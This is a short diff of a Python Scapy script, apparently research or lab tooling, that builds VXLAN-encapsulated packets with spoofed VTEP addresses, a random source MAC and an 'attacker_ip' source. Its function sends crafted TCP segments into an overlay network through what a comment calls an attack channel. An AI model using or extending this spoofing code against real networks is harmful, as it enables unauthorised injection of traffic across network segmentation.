@@ -32,11 +32,10 @@ destination_ip = sys.argv[1]
 s_port = random.randint(20000,65500)
 d_port = int(sys.argv[2])
 
-### TCP-Flags definieren
-Flags = {"FIN": 0x01,"SYN": 0x02,"RST": 0x04,"PSH": 0x08,"ACK": 0x10,"URG": 0x20,"ECE": 0x40,"CWR": 0x80}
 # Outer Header for VxLAN-Spoofing
 spoof_vxlan = IP(src=vtep_src,dst=vtep_dst)/UDP(sport=vxlanport,dport=vxlanport)/VXLAN(vni=vx_vnid,flags="Instance")
 
+# Function for sending TCP Packets over the AAttack_Channel
 def send_spoofed_TCP(_seq, _ack, _flags):
     send(spoof_vxlan / Ether(dst=mac_dst,src=random_mac) / IP(src=attacker_ip,dst=destination_ip) / TCP(sport=s_port, dport=d_port, seq=_seq, ack=_ack, flags=_flags))
     return
